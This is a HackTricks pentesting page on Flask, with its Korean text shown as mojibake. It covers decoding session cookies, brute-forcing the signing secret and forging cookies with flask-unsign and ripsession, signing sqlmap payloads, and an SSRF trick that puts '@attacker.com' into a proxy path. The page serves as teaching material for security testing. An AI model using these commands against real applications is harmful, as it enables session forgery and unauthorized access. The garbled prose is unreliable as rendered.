# Flask

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (515).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=flask)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ **ê°€ì¥ ì§„ë³´ëœ** ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¡œ êµ¬ë™ë˜ëŠ” **ì›Œí¬í”Œë¡œìš°**ë¥¼ ì‰½ê²Œ êµ¬ì¶•í•˜ê³  **ìë™í™”**í•˜ì„¸ìš”.\
ì˜¤ëŠ˜ ë°”ë¡œ ì ‘ê·¼í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=flask" %}

**CTFë¥¼ ì§„í–‰ ì¤‘ì´ë¼ë©´ Flask ì• í”Œë¦¬ì¼€ì´ì…˜ì´** [**SSTI**](../../pentesting-web/ssti-server-side-template-injection/) **ì™€ ê´€ë ¨ì´ ìˆì„ ê²ƒì…ë‹ˆë‹¤.**

## ì¿ í‚¤

ê¸°ë³¸ ì¿ í‚¤ ì„¸ì…˜ ì´ë¦„ì€ **`session`**ì…ë‹ˆë‹¤.

### ë””ì½”ë”

ì˜¨ë¼ì¸ Flask ì¿ í‚¤ ë””ì½”ë”: [https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

#### ìˆ˜ë™

ì¿ í‚¤ì˜ ì²« ë²ˆì§¸ ë¶€ë¶„ì„ ì²« ë²ˆì§¸ ì ê¹Œì§€ ê°€ì ¸ì™€ Base64ë¡œ ë””ì½”ë“œí•˜ì„¸ìš”.
```bash
echo "ImhlbGxvIg" | base64 -d
```
ì¿ í‚¤ëŠ” ë¹„ë°€ë²ˆí˜¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„œëª…ë©ë‹ˆë‹¤.

### **Flask-Unsign**

Flask ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì„¸ì…˜ ì¿ í‚¤ë¥¼ ê°€ì ¸ì˜¤ê³ , ë””ì½”ë“œí•˜ê³ , ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©ì„ ìˆ˜í–‰í•˜ë©°, ë¹„ë°€ í‚¤ë¥¼ ì¶”ì¸¡í•˜ì—¬ ì œì‘í•˜ëŠ” ëª…ë ¹ì¤„ ë„êµ¬ì…ë‹ˆë‹¤.

{% embed url="https://pypi.org/project/flask-unsign/" %}
```bash
pip3 install flask-unsign
```
#### **ì¿ í‚¤ ë””ì½”ë“œ**
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
#### **ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©**
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```
#### **ì„œëª…**
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```
#### ë ˆê±°ì‹œ(êµ¬ë²„ì „) ì‚¬ìš© ì„œëª…
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```
### **RIPsession**

ì¿ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì›¹ì‚¬ì´íŠ¸ë¥¼ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©í•˜ëŠ” ëª…ë ¹ì¤„ ë„êµ¬ë¡œ, flask-unsignìœ¼ë¡œ ì œì‘ë˜ì—ˆìŠµë‹ˆë‹¤.

{% embed url="https://github.com/Tagvi/ripsession" %}
```bash
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```
### SQLi in Flask session cookie with SQLmap

[**ì´ ì˜ˆì œ**](../../pentesting-web/sql-injection/sqlmap/#eval)ëŠ” sqlmap `eval` ì˜µì…˜ì„ ì‚¬ìš©í•˜ì—¬ **ì•Œë ¤ì§„ ë¹„ë°€ì„ ì‚¬ìš©í•˜ì—¬ flaskì— ëŒ€í•œ sqlmap í˜ì´ë¡œë“œë¥¼ ìë™ìœ¼ë¡œ ì„œëª…í•˜ëŠ” ë°©ë²•**ì„ ë³´ì—¬ì¤ë‹ˆë‹¤.

## Flask Proxy to SSRF

[**ì´ ê¸€**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)ì—ì„œëŠ” Flaskê°€ "@" ë¬¸ìë¡œ ì‹œì‘í•˜ëŠ” ìš”ì²­ì„ í—ˆìš©í•˜ëŠ” ë°©ë²•ì„ ì„¤ëª…í•©ë‹ˆë‹¤:
```http
GET @/ HTTP/1.1
Host: target.com
Connection: close
```
ë‹¤ìŒ ì‹œë‚˜ë¦¬ì˜¤ ì¤‘:
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```
ë‹¤ìŒê³¼ ê°™ì€ "@attacker.com"ì„ ë„ì…í•  ìˆ˜ ìˆì–´ **SSRF**ë¥¼ ìœ ë°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

<figure><img src="../../.gitbook/assets/image (515).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=flask)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ **ê°€ì¥ ì§„ë³´ëœ** ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¡œ êµ¬ë™ë˜ëŠ” **ì›Œí¬í”Œë¡œìš°**ë¥¼ ì‰½ê²Œ êµ¬ì¶•í•˜ê³  **ìë™í™”**í•˜ì„¸ìš”.\
ì§€ê¸ˆ ë°”ë¡œ ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=flask" %}

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…í•˜ê±°ë‚˜** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}
